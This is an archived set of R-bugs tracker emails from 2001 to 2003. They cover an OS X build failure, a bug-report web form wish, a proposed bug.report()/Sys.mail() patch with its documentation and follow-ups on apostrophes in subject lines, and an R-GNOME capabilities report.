From buerkla@uwec.edu Tue Apr 29 20:24:13 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3TIOC2b027860
	for <R-bugs@biostat.ku.dk>; Tue, 29 Apr 2003 20:24:12 +0200 (MET DST)
Date: Tue, 29 Apr 2003 20:24:12 +0200 (MET DST)
Message-Id: <200304291824.h3TIOC2b027860@pubhealth.ku.dk>
From: buerkla@uwec.edu
To: R-bugs@biostat.ku.dk
Subject: configure succeeds without dlfcn.h, but fails to compile (OS X)

Full_Name: Alex Buerkle
Version: 1.7.0
OS: OS X 
Submission from: (NULL) (137.28.112.199)


The configure of R-1.7.0 completed, but the build fails with error
below.  This failure appears to be because dlfcn.h was missing (installing it
fixed the problem).  

The possible bug:  my limited ability to read ./configure suggests that it tests
for dlfcn.h, but does not fail if it doesn't find it on Darwin/OS X.  Given that
it is required to compile, it seems like configure should fail.  
 

This error was reported in June 2002
(http://maths.newcastle.edu.au/~rking/R/help/02a/4783.html) and discussed
briefly in a thread I started on R-SIG-Mac, which contains a few more details
(https://www.stat.math.ethz.ch/pipermail/r-sig-mac/2003-April/000832.html).

The error:

./configure --enable-R-shlib --with-x \
--with-blas='-framework vecLib' \
--with-lapack

...

./make 

...

making strdup.d from strdup.c
making strncasecmp.d from strncasecmp.c
making vsnprintf.d from vsnprintf.c
gcc   -I../../src/extra/pcre -no-cpp-precomp -I. -I../../src/include
-I../../src/include -I/sw/include -DHAVE_CONFIG_H   -g -O2 -c
CConverters.c -o CConverters.o
gcc   -I../../src/extra/pcre -no-cpp-precomp -I. -I../../src/include
-I../../src/include -I/sw/include -DHAVE_CONFIG_H   -g -O2 -c
Rdynload.c -o Rdynload.o
Rdynload.c: In function `R_FindSymbol':
Rdynload.c:1036: `CFunTab' undeclared (first use in this function)
Rdynload.c:1036: (Each undeclared identifier is reported only once
Rdynload.c:1036: for each function it appears in.)
make[3]: *** [Rdynload.o] Error 1
make[2]: *** [R] Error 2
make[1]: *** [R] Error 1
make: *** [R] Error 1



Fix for the user:
The fink package dlcompat-dev is required, as it contains /sw/include/dlfcn.h.



==> 2875.audit <==
Sat May  3 11:24:24 2003	maechler	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2876 *
Subject: Re: [Rd]  configure succeeds without dlfcn.h, but fails to compile
From: Thomas Lumley <tlumley@u.washington.edu>
Date: Tue, 29 Apr 2003 13:02:25 -0700 (PDT)
--follow up to 2875
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2876 <==
From tlumley@u.washington.edu Tue Apr 29 22:02:28 2003
Received: from mxout1.cac.washington.edu (mxout1.cac.washington.edu [140.142.32.134])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3TK2R2b028313
	for <R-bugs@biostat.ku.dk>; Tue, 29 Apr 2003 22:02:27 +0200 (MET DST)
Received: from homer03.u.washington.edu (homer03.u.washington.edu [140.142.15.37])
	by mxout1.cac.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h3TK2PRG015121;
	Tue, 29 Apr 2003 13:02:25 -0700
Received: from localhost (tlumley@localhost)
	by homer03.u.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h3TK2Phw226700;
	Tue, 29 Apr 2003 13:02:25 -0700
Date: Tue, 29 Apr 2003 13:02:25 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: buerkla@uwec.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd]  configure succeeds without dlfcn.h, but fails to compile
 (OS X) (PR#2875)
In-Reply-To: <200304291824.h3TIOD2b027864@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0304291254210.104800-100000@homer03.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 29 Apr 2003 buerkla@uwec.edu wrote:

> Full_Name: Alex Buerkle
> Version: 1.7.0
> OS: OS X
> Submission from: (NULL) (137.28.112.199)
>
>
> The configure of R-1.7.0 completed, but the build fails with error
> below.  This failure appears to be because dlfcn.h was missing (installing it
> fixed the problem).
>
> The possible bug:  my limited ability to read ./configure suggests that it tests
> for dlfcn.h, but does not fail if it doesn't find it on Darwin/OS X.  Given that
> it is required to compile, it seems like configure should fail.
>
>

I think in fact the problem is that there is a bug in the code for when
dynamic loading is not available. There are various tests for
HAVE_DYNAMIC_LOADING, suggesting that it was once possible to compile
without it.

	-thomas






==> 2876.audit <==
Thu May 29 10:39:02 2003	ripley	changed notes
Thu May 29 10:39:02 2003	ripley	foobar
Thu May 29 10:39:02 2003	ripley	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Misc

* PR# 1126 *
Subject: R-bug report www page whishlist
From: jens.lund@nordea.com
Date: Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1126 <==
From jens.lund@nordea.com  Wed Oct 10 18:24:29 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA01798
	for <R-bugs@biostat.ku.dk>; Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
Date: Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
From: jens.lund@nordea.com
Message-Id: <200110101624.SAA01798@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: R-bug report www page whishlist

Full_Name: Jens Lund
Version: --
OS: --
Submission from: (NULL) (194.239.194.210)


On http://r-bugs.biostat.ku.dk/cgi-bin/R pressing "new bug report" returns a new
form. It would, IMHO, be natural to place the "submit bug report" button on this
form *below* the input area for the actual bug report :-)

Cheers, Jens

==> 1126.audit <==
Wed Oct 10 19:08:54 2001	ripley	moved from incoming to Misc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1158 *
Subject: bug.report()sends empty message
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
Date: Mon, 05 Nov 2001 10:05:27 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1158 <==
From pgilbert@bank-banque-canada.ca  Mon Nov  5 16:07:41 2001
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA03956
	for <r-bugs@biostat.ku.dk>; Mon, 5 Nov 2001 16:07:39 +0100 (MET)
Received: from fwx-t1 ([140.80.193.132])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id KAA05318;
	Mon, 5 Nov 2001 10:01:04 -0500 (EST)
Message-ID: <3BE6AAB6.E0962CD5@bank-banque-canada.ca>
Date: Mon, 05 Nov 2001 10:05:27 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.7 [en] (Win95; U)
X-Accept-Language: en
MIME-Version: 1.0
To: R-bugs <r-bugs@biostat.ku.dk>
CC: brahm@alum.mit.edu
Subject: bug.report()sends empty message
Content-Type: multipart/mixed;
 boundary="------------FAC78F7B6BFECAD9BD873458"

This is a multi-part message in MIME format.
--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Mon, 22 Oct 2001, David Brahm wrote:
>    I swear, bug.report() ate my message!  Apologies to all, esp. Peter
who
> will once again have to clean up after my mess...

With some editors on Unix bug.report() does this. The problem is that
some editors (like Nedit) fork a separate process and return. The Unix
version of bug.report sends an empty message in this case. The fix is to
make the Unix version the same as the Windows version, with an optional
argument "wait".

Attached are four small files bug.report.R, bug.report.Rd, Sys.mail.R,
and Sys.mail.Rd, which attempt to fix the problem and the documentation.
They also separate out the mail mechanism as a utility that can be used
elsewhere. Unfortunately, I have only been able to test these on a
limited number of platforms.

Paul Gilbert

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="bug.report.R"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="bug.report.R"

bug.report <- function(subject = "", ccaddress = Sys.getenv("USER"),
                       method = getOption("mailer"),
                       address = "gilp",  #"r-bugs@r-project.org",
                       file = "R.bug.report",
		       wait=TRUE)
{
    methods <- c("mailx", "gnudoit", "none", "ess")

    method <-
	if(is.null(method)) "none"
	else methods[pmatch(method, methods)]

    body <- paste("\\n<<insert bug report here>>\\n\\n\\n\\n",
		  "--please do not edit the information below--\\n\\n",
		  "Version:\\n ",
		  paste(names(R.version),R.version, sep=" = ",collapse="\\n "),
		  "\\n\\n",
		  "Search Path:\\n ",
		  paste(search(), collapse=", "),
		  "\\n", sep="", collapse="")

    if(method == "gnudoit") {
	cmd <- paste("gnudoit -q '",
		     "(mail nil \"", address, "\")",
		     "(insert \"", body, "\")",
		     "(search-backward \"Subject:\")",
		     "(end-of-line)'",
		     sep="")
	system(cmd)
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
    else if(method=="none"){

        disclaimer <-
            paste("# Your mailer is set to \"none\" (default on Windows),\n",
                  "# hence we cannot send the bug report directly from R.\n",
                  "# Please copy the bug report (after finishing it) to\n",
                  "# your favorite email program and send it to\n#\n",
                  "#       ", address, "\n#\n",
                  "######################################################\n",
                  "\n\n", sep = "")

        cat(disclaimer, file=file)
	body <- gsub("\\\\n", "\n", body)
	cat(body, file=file, append=TRUE)
	system(paste(getOption("editor"), file))
        cat("The unsent bug report can be found in file", file, "\n")
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
    else if(method == "mailx"){

        if(missing(subject)) stop("Subject missing")

	body <- gsub("\\\\n", "\n", body)
	cat(body, file=file, append=FALSE)
	system(paste(getOption("editor"), file))
	
	if (wait) {
	  cat("Submit the bug report? (finish editing and save the file before responding) ")
	  answer <- readline()
	  answer <- grep("y", answer, ignore.case=TRUE)
	  if(length(answer)>0){
 	     body <- scan(file, what="char", sep="\n")
             cat("Sending email ...\n")
             status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="mailx")
             if(!status) status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="mail")
             if(!status) status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="Mail")
             if(!status) {
                cat("Sending email failed!\n")
                cat("The unsent bug report can be found in file", file, "\n")
            }
	  }
        }
        else cat("The unsent bug report can be found in file", file, "\n")
    }
    else if(method=="ess"){
	body <- gsub("\\\\n", "\n", body)
	cat(body)
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
}

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="bug.report.Rd"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="bug.report.Rd"

\name{bug.report}
\alias{bug.report}
\title{Send a Bug Report}
\usage{
bug.report(subject = "", ccaddress = Sys.getenv("USER"),
           method = getOption("mailer"), 
	   address = "r-bugs@r-project.org",
           file = "R.bug.report",
	   wait = TRUE)

}
\arguments{
  \item{subject}{Subject of the email. Please do not use single quotes
    (\code{'}) in the subject!}
  \item{ccaddress}{Optional email address for copies (default is current
    user).  Use \code{ccaddress = NULL} for no copies.}
  \item{method}{Submission method, one of \code{"mailx"},
    \code{"gnuclient"}, \code{"none"}, or \code{"ess"}.}
  \item{address}{Recipient's email address.}
  \item{file}{File to use for setting up the email (or storing it when
    method is \code{"none"} or sending mail fails).}
  \item{wait}{logical. Should \R wait for the editor to return?}
}
\description{
  Invokes an editor to write a bug report and optionally mail it to the
  r-bugs list at \email{r-bugs@r-project.org}.  Some standard
  information on the current version and configuration of \R are 
  included automatically.
}
\details{
  Currently direct submission of bug reports works only on Unix systems.
  If the submission method is \code{"mailx"}, then the default editor is
  used to write the bug report. Which editor is used can be controlled
  using \code{\link{options}}, type \code{getOption("editor")} to see what
  editor is currently defined. Please use the help pages of the
  respective editor for details of usage. After saving the bug report
  (in the temporary file opened) and exiting the editor
  the report is mailed using a Unix command line mail utility such as
  \code{mailx}.  A copy of the mail is sent to the current user.

  If method is \code{"gnuclient"}, then an emacs mail buffer is opened
  and used for sending the email.

  If method is \code{"none"} or \code{NULL} (which is the default on
  Windows systems), then only an editor is opened to help writing the
  bug report.  The report can then be copied to your favorite email
  program and be sent to the r-bugs list.

  If method is \code{"ess"} the body of the mail is simply sent to
  stdout.
  
  If wait is \code{"TRUE"} then \R issues a prompt after the editor is started
  and waits for input. If \R is sending the mail (e.g. with method
  code{"mailx"}) then wait should be \code{"TRUE"}. In this case the edited file
  must be saved before responding to the question.
}
\value{Nothing useful.}
\section{When is there a bug?}{
  If \R executes an illegal instruction, or dies with an operating
  system error message that indicates a problem in the program (as
  opposed to something like ``disk full''), then it is certainly a bug.

  Taking forever to complete a command can be a bug, but you must make
  certain that it was really \R's fault.  Some commands simply take a
  long time.  If the input was such that you KNOW it should have been
  processed quickly, report a bug.  If you don't know whether the
  command should take a long time, find out by looking in the manual or
  by asking for assistance.

  If a command you are familiar with causes an \R error message in a
  case where its usual definition ought to be reasonable, it is probably
  a bug.  If a command does the wrong thing, that is a bug.  But be sure
  you know for certain what it ought to have done.  If you aren't
  familiar with the command, or don't know for certain how the command
  is supposed to work, then it might actually be working right.  Rather
  than jumping to conclusions, show the problem to someone who knows for
  certain.

   Finally, a command's intended definition may not be best for
   statistical analysis.  This is a very important sort of problem, but
   it is also a matter of judgment.  Also, it is easy to come to such a
   conclusion out of ignorance of some of the existing features.  It is
   probably best not to complain about such a problem until you have
   checked the documentation in the usual ways, feel confident that you
   understand it, and know for certain that what you want is not
   available.  If you are not sure what the command is supposed to do
   after a careful reading of the manual this indicates a bug in the
   manual.  The manual's job is to make everything clear.  It is just as
   important to report documentation bugs as program bugs.

   If the online argument list of a function disagrees with the manual,
   one of them must be wrong, so report the bug.
}
\section{How to report a bug}{
  When you decide that there is a bug, it is important to report it and
  to report it in a way which is useful.  What is most useful is an
  exact description of what commands you type, from when you start \R
  until the problem happens.  Always include the version of \R, machine,
  and operating system that you are using; type `version' in \R to print
  this. 

  The most important principle in reporting a bug is to report FACTS,
  not hypotheses or categorizations.  It is always easier to report the
  facts, but people seem to prefer to strain to posit explanations and
  report them instead.  If the explanations are based on guesses about
  how \R is implemented, they will be useless; we will have to try to 
  figure out what the facts must have been to lead to such
  speculations.  Sometimes this is impossible.  But in any case, it is
  unnecessary work for us.

  For example, suppose that on a data set which you know to be quite
  large the command \code{data.frame(x, y, z, monday, tuesday)} never
  returns.  Do not report that \code{data.frame()} fails for large data
  sets.  Perhaps it fails when a variable name is a day of the week.  If
  this is so then when we got your report we would try out the
  \code{data.frame()} command on a large data set, probably with no day
  of the week variable name, and not see any problem. There is no way in
  the world that we could guess that we should try a day of the week
  variable name.

  Or perhaps the command fails because the last command you used was a
  \code{[} method that had a bug causing \R's internal data structures
  to be corrupted and making the \code{data.frame()} command fail from
  then on.  This is why we need to know what other commands you have
  typed (or read from your startup file).

  It is very useful to try and find simple examples that produce
  apparently the same bug, and somewhat useful to find simple examples
  that might be expected to produce the bug but actually do not.  If you
  want to debug the problem and find exactly what caused it, that is
  wonderful.  You should still report the facts as well as any
  explanations or solutions.

  Invoking \R with the \code{--vanilla} option may help in isolating a
  bug.  This ensures that the site profile and saved data files are not
  read.

  On some systems a bug report can be generated using the
  \code{bug.report()} function.  This automatically includes the version
  information and sends the bug to the correct address.  Alternatively
  the bug report can be emailed to \email{r-bugs@r-project.org} or
  submitted to the Web page at \url{http://bugs.r-project.org}.
}
\seealso{R FAQ, \code{link{Sys.mail}} }
\author{This help page is adapted from the Emacs manual}
\keyword{utilities}
\keyword{error}

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="Sys.mail.R"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Sys.mail.R"

Sys.mail <- function(address = Sys.info()$user,
                     ccaddress  = NULL,
                     bccaddress = NULL,
		     subject    = NULL,
		     body= "no body",
                     method = getOption("mailer")) {
   if(!(is.character(address) && nchar(address)>0))
      stop("A character string address must be specified.")

   # The arguments to mail, mailx, and Mail are all the same, but a different
   # mailer will require that this first part be re-organized under the
   # specific method.
   file <- tempfile()
   on.exit(unlink(file))
   cat(body, file=file, append=FALSE, sep="\n")
   cmdargs <- paste(address, "<", file, "2>/dev/null")
	
   if(is.character(ccaddress) && nchar(ccaddress)>0) 
            cmdargs <- paste(" -c '", ccaddress, "' ",  cmdargs)

   if(is.character(bccaddress) && nchar(bccaddress)>0) 
            cmdargs <- paste(" -b '", bccaddress, "' ",  cmdargs)

   if(is.character(subject) && nchar(subject)>0) 
            cmdargs <- paste(" -s '", subject, "' ",  cmdargs)

   status <- 1
   if(method == "mailx") status <- system(paste("mailx", cmdargs)) else
   if(method == "mail")  status <- system(paste("mail", cmdargs))  else 
   if(method == "Mail")  status <- system(paste("Mail", cmdargs))  else {
	warning(paste("mail method ", method, " not supported.\n"))
	return(F)
	}
   if(status > 0) {
	warning(paste("sending email with ", method, " failed.\n"))
	return(F)
	}
   T
   }

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="Sys.mail.Rd"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Sys.mail.Rd"

\name{Sys.mail}
\alias{Sys.mail}
\title{Send Mail}
\usage{
Sys.mail(address= Sys.info()$user, ccaddress = NULL, bccaddress = NULL,
           subject = NULL, body= "no body", method = getOption("mailer"))
}
\arguments{
  \item{address}{Recipient's email address. The default is the user name as
     indicated by \code{Sys.info()$user}, which will correspond to your 
     own email address on many systems.}
  \item{ccaddress}{Optional email address for copies. 
    Use \code{ccaddress = NULL} for no copies.}
  \item{bccaddress}{Optional email address for blind copies.
    Use \code{bccaddress = NULL} for no copies.}
  \item{subject}{Subject of the email. Please do not use single quotes
     in the subject!}
  \item{method}{Submission method, one of \code{"mailx"},
    \code{"mail"}, or \code{"Mail"}.}
  \item{body}{A vector of character, one line per element to place in the body
     of the email.}
}
\description{
  Use a system mail tool to send a message. Multiple recipients can be
  specified in any of the addresses by enclosing them in double (\code{"}) 
  quotes. Please do not use single (\code{'}) quotes.
  
  The body is a vector of character. Each element of body is written 
  as a line of the message body.
}
\details{
  Currently works only on Unix systems using "mailx", "mail" or "Mail". The mail
  tool needs to be found on your Unix search path.
}
\value{TRUE or FALSE indicating success or failure as returned by the operating
    system. (This does not indicate that the message was received at the 
    address.)}

\examples{
    \dontrun{Sys.mail(address="friends", subject="R", body="R is great")}
}
\seealso{\code{link{options}} }
\author{Paul Gilbert}
\keyword{utilities}


--------------FAC78F7B6BFECAD9BD873458--


==> 1158.audit <==
Sat Nov 17 11:59:57 2001	ripley	foobar
Sat Nov 17 11:59:57 2001	ripley	moved from incoming to Misc

==> 1158.followup.1 <==
From postmaster@franz.stat.wisc.edu  Mon Dec 10 19:37:36 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA01758
	for <r-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 19:37:35 +0100 (MET)
Received: from mailmro2.fmr.com (really [192.223.198.254]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16DVIu-000IheC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 10 Dec 2001 12:37:28 -0600 (CST) 
Received: from virmro110nts.fmr.com (virmro110nts.fmr.com [172.26.5.98])
	by mailmro2.fmr.com (Switch-2.2.0/Switch-2.2.0) with SMTP id fBAIaqX07055
	for <r-bugs@r-project.org>; Mon, 10 Dec 2001 13:36:52 -0500 (EST)
Received: from arbprod.fmr.com (arbproda.fmr.com [155.1.103.75]) by msgbos102nts.fmr.com with SMTP (Microsoft Exchange Internet Mail Service Version 5.5.2654.89)
	id W0GPQMRB; Mon, 10 Dec 2001 13:36:51 -0500
Received: (from a215020@localhost)
	by arbprod.fmr.com (8.11.1/8.11.1) id fBAIapl09851;
	Mon, 10 Dec 2001 13:36:51 -0500 (EST)
Date: Mon, 10 Dec 2001 13:36:51 -0500 (EST)
From: David Brahm  <a215020@onyx.fmr.com>
Message-Id: <200112101836.fBAIapl09851@arbprod.fmr.com>
Reply-to: brahm@alum.mit.edu
To: r-bugs@r-project.org
Cc: a215020@arbprod.fmr.com
Subject:  Re: bug.report() sends empty message (PR#1158) 

   On Oct 22, I sent an empty bug report (#1138) because bug.report() "ate my
message".  Paul Gilbert opened a new bug report (#1158) for this problem.

   I'm now convinced it's because I had an apostrophe in the subject line
("round() doesn't").  The bug.report documentation specifically warns against
this, but the bug.report() function could also check for it!  I suggest adding
this line to the bug.report code:

  if (regexpr("'", subject) > 0) stop("Please, no apostrophe in the subject.")

                              -- David Brahm (brahm@alum.mit.edu)

R> getOption("mailer")
   [1] "mailx"
Version:
 platform = sparc-sun-solaris2.6
 arch = sparc
 os = solaris2.6
 system = sparc, solaris2.6
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:misc, package:io, package:arrays, package:ls1, package:g.data, package:db, package:ts, package:ctest, Autoloads, package:base

==> 1158.followup.2 <==
From pgilbert@bank-banque-canada.ca  Mon Dec 10 20:09:31 2001
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA01969
	for <R-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 20:09:29 +0100 (MET)
Received: from fwx-int (fwx-int.bank-banque-canada.ca [140.80.193.129])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id OAA00487;
	Mon, 10 Dec 2001 14:04:01 -0500 (EST)
Received: from mfa99599.boc by mailhost.bank-banque-canada.ca (8.8.8+Sun/SMI-SVR4)
	id NAA05366; Mon, 10 Dec 2001 13:53:57 -0500 (EST)
Received: from mfa01506.boc (mfa01506 [140.80.3.112])
	by mfa99599.boc (8.9.1b+Sun/8.9.1) with ESMTP id NAA29819;
	Mon, 10 Dec 2001 13:53:56 -0500 (EST)
Received: from bank-banque-canada.ca (localhost [127.0.0.1])
	by mfa01506.boc (8.9.3+Sun/8.9.3) with ESMTP id NAA09467;
	Mon, 10 Dec 2001 13:53:53 -0500 (EST)
Sender: pgilbert@bank-banque-canada.ca
Message-ID: <3C1504C0.1ADC7F0D@bank-banque-canada.ca>
Date: Mon, 10 Dec 2001 13:53:52 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.75 [en] (X11; U; SunOS 5.8 sun4u)
X-Accept-Language: en
MIME-Version: 1.0
To: brahm@alum.mit.edu
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Re: bug.report() sends empty message (PR#1158)
References: <200112101837.TAA01768@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

brahm@alum.mit.edu wrote:
>   On Oct 22, I sent an empty bug report (#1138) because bug.report()
>"ate my
>message".  Paul Gilbert opened a new bug report (#1158) for this
>problem.

>   I'm now convinced it's because I had an apostrophe in the subject
>line

Your problem may have been due to the apostrophe, but it reminded me of another
outstanding problem which I had neglected to report previously: wait=TRUE as in
the windows version seems to be necessary with some Unix editors too (e.g.
Nedit).

Paul Gilbert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1503 *
Subject: R-GNOME
From: Patrick Gonin <gonin@genethon.fr>
Date: Thu, 2 May 2002 09:29:07 +0200
--1) is not a bug, as jpeg etc work.  capabilities() has been changed for 1.5.1
--2) system() needs a new version for GNOME.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1503 <==
From gonin@genethon.fr  Thu May  2 09:30:07 2002
Received: from diogene.genethon.fr (root@diogene.genethon.fr [193.50.68.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA00984
	for <r-bugs@biostat.ku.dk>; Thu, 2 May 2002 09:30:06 +0200 (MET DST)
Received: (from root@localhost)
	by diogene.genethon.fr (8.11.5/8.11.5) id g427TSs22721
	for r-bugs@biostat.ku.dk; Thu, 2 May 2002 09:29:28 +0200 (MET DST)
Received: from [192.168.100.154] (nat0-154.genethon.fr [192.168.100.154])
	by diogene.genethon.fr (8.11.5/8.11.5) with ESMTP id g427TOA22697
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 09:29:24 +0200 (MET DST)
Mime-Version: 1.0
X-Sender: gonin@diogene.genethon.fr
Message-Id: <a05100300b8f698c569f1@[192.168.100.154]>
Date: Thu, 2 May 2002 09:29:07 +0200
To: R-bugs@biostat.ku.dk
From: Patrick Gonin <gonin@genethon.fr>
Subject: R-GNOME
Content-Type: text/plain; charset="iso-8859-1" ; format="flowed"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id JAA00984

Hi R colleagues,

I don't know whether this is a bug, but something weird happen with R-GNOME.
Version 1.5.0.
I compiled the stuff under i-686 Linux RH 7.2 using ./configure --with-gnome.
R can be started with or without the Gnome interface: fine.
However, when I start with Gnome interface, jpeg and a few other 
things are unavailable (checked using capabilities()), whereas 
everything is available (except Gnome) when I start R without Gnome.
Also, some calls seem available with Gnome: system("..") returns nothing.
Maybe this is related to the experimental nature of the Gnome interface.
Hope that helps.
Cheers,
-- 
----------------------------
Patrick Gonin, DVM, PhD
Head of in vivo Evaluation Dept
Généthon
1 bis, rue de l'Internationale- BP 60
91002 EVRY CEDEX
FRANCE
Tel: 33-1-69-47-10-21
Fax: 33-1-60-77-86-98
gonin@genethon.fr
----------------------------

==> 1503.followup.1 <==
From ripley@stats.ox.ac.uk  Thu May  2 11:22:18 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA02921
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 11:22:18 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA23483;
	Thu, 2 May 2002 10:21:37 +0100 (BST)
Date: Thu, 2 May 2002 10:21:37 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <gonin@genethon.fr>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R-GNOME (PR#1503)
In-Reply-To: <200205020730.JAA00989@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0205021016060.3970-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=X-UNKNOWN
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from QUOTED-PRINTABLE to 8bit by pubhealth.ku.dk id LAA02921

On Thu, 2 May 2002 gonin@genethon.fr wrote:

> Hi R colleagues,
>
> I don't know whether this is a bug, but something weird happen with R-GNOME.
> Version 1.5.0.
> I compiled the stuff under i-686 Linux RH 7.2 using ./configure --with-gnome.
> R can be started with or without the Gnome interface: fine.
> However, when I start with Gnome interface, jpeg and a few other
> things are unavailable (checked using capabilities()), whereas
> everything is available (except Gnome) when I start R without Gnome.

Have you actually tried them?  capabilities() can be wrong, as it only
reports what it is sure about.  For me under RH7.2 jpeg(), png() and X11()
do all work under R --gui=gnome.  (Well, actually gnome has problems with
its dialogs as it makes assumptions about the X11 system in use and I am
not using XFree86.)

I will try to work out a more definitive algorithm for capabilities, but
its main use is to test if checks should be run, so it needs to be
conservative.  And as you note, Gnome is experimental and has a separate
maintainer ....

> Also, some calls seem available with Gnome: system("..") returns nothing.
> Maybe this is related to the experimental nature of the Gnome interface.
> Hope that helps.
> Cheers,
> --
> ----------------------------
> Patrick Gonin, DVM, PhD
> Head of in vivo Evaluation Dept
> Généthon
> 1 bis, rue de l'Internationale- BP 60
> 91002 EVRY CEDEX
> FRANCE
> Tel: 33-1-69-47-10-21
> Fax: 33-1-60-77-86-98
> gonin@genethon.fr
> ----------------------------
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1503.followup.2 <==
From plummer@iarc.fr  Thu May  2 12:32:14 2002
Received: from smtp01.iarc.fr (IDENT:root@smtp01-193.iarc.fr [193.51.164.211])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA04003
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 12:32:04 +0200 (MET DST)
Received: from xena.iarc.fr ([10.10.150.201])
	by smtp01.iarc.fr (8.9.3/8.9.3) with ESMTP id MAA17293;
	Thu, 2 May 2002 12:30:44 +0200
Message-ID: <XFMail.20020502123210.plummer@iarc.fr>
